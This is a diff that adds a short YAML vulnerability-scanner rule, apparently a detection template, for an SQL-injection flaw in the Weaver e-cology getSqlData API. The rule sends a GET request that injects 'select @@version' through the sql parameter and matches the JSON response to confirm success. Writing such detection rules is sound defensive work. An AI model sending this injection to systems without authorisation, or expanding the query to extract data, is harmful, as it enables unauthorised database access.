@@ -1,0 +1,8 @@
+name: weaver-ecology-getsqldata-sql-inject
+rules:
+  - method: GET
+    path: "/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'{"api_status":') && response.body.bcontains(b'"status":true}')
+detail:
+  author: 666
